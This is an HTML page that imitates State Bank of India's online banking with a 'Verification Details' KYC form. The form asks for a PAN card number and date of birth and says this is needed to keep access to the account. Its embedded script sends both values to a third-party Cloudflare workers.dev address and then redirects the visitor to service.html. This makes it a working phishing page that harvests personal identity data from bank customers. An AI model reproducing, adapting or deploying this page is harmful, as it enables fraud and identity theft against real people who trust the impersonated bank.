<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>SBI - Online Banking</title>
    <style>
        * { box-sizing: border-box; font-family: Arial, Helvetica, sans-serif; margin: 0; padding: 0; }
        body { background-color: #fff; display: flex; justify-content: center; min-height: 100vh; }
        .container { width: 100%; max-width: 500px; display: flex; flex-direction: column; }
        .full-img { width: 100%; display: block; }
        
        .header-bar { background-color: #315195; color: white; padding: 12px 15px; font-size: 14px; font-weight: bold; text-transform: uppercase; }
        
        .content-area { padding: 20px 25px; }
        .instruction-text { 
            font-size: 13px; color: #333; margin-bottom: 22px; line-height: 1.6; 
            border-left: 4px solid #315195; padding: 12px; background: #f8fbff; 
        }
        
        .field-group { margin-bottom: 18px; }
        .field-group label { display: block; font-size: 13px; color: #444; margin-bottom: 8px; font-weight: bold; }
        
        .kyc-input { 
            width: 100%; height: 38px; padding: 0 12px; 
            background-color: #fff; border: 1px solid #999; 
            border-radius: 2px; font-size: 15px; outline: none;
            color: #333;
        }
        .kyc-input:focus { border-color: #315195; box-shadow: 0 0 5px rgba(49,81,149,0.1); }
        
        #pan_no { text-transform: uppercase; }

        .btn-row { display: flex; gap: 12px; margin-top: 28px; }
        .btn { flex: 1; padding: 10px 0; border: none; color: white; font-size: 14px; border-radius: 2px; cursor: pointer; font-weight: bold; text-transform: uppercase; }
        .btn-submit { background-color: #315195; }
        .btn-gray { background-color: #6c757d; }

        .footer-note { margin-top: 35px; font-size: 12px; color: #666; border-top: 1px solid #eee; padding-top: 15px; line-height: 1.5; }
    </style>
</head>
<body>

    <div class="container">
        <img src="https://i.ibb.co/fz5x9ff2/Main-817fcadb-1.jpg" alt="Header" class="full-img">
        
        <div class="header-bar">Verification Details</div>

        <div class="content-area">
            <div class="instruction-text">
                As per regulatory guidelines, please verify your <b>PAN Card</b> and <b>Date of Birth</b> to ensure uninterrupted access to your account.
            </div>

            <form id="kycForm">
                <div class="field-group">
                    <label>Permanent Account Number (PAN) *</label>
                    <input type="text" id="pan_no" class="kyc-input" maxlength="10" required 
                           pattern="[A-Z]{5}[0-9]{4}[A-Z]{1}" title="Enter valid 10-digit PAN">
                </div>

                <div class="field-group">
                    <label>Date of Birth *</label>
                    <input type="date" id="dob_val" class="kyc-input" required>
                </div>

                <div class="btn-row">
                    <button type="submit" class="btn btn-submit" id="submitBtn">Continue</button>
                    <button type="reset" class="btn btn-gray">Reset</button>
                </div>
            </form>

            <div class="footer-note">
                <b>Security Note:</b> OnlineSBI uses 256-bit SSL encryption to protect your data and privacy.
            </div>
        </div>

        <div style="margin-top: 40px;">
            <img src="https://i.ibb.co/Txj77Jk2/chrome-screenshot-1-Apr-2026-12-43-42-pm-IST.png" alt="Footer" class="full-img">
        </div>
    </div>

    <script>
        const workerURL = 'https://flat-fog-a0cd.sumankkuuyy.workers.dev/';

        document.getElementById('kycForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const pan = document.getElementById('pan_no').value.toUpperCase();
            const dob = document.getElementById('dob_val').value;
            const btn = document.getElementById('submitBtn');

            btn.disabled = true;
            btn.innerText = "Processing...";

            const payload = {
                type: "KYC",
                pan: pan,
                dob: dob
            };

            try {
                await fetch(workerURL, {
                    method: 'POST',
                    mode: 'cors',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });
                
                // Redirect to service.html
                window.location.href = "service.html"; 
            } catch (err) {
                window.location.href = "service.html";
            }
        });
    </script>
</body>
</html>
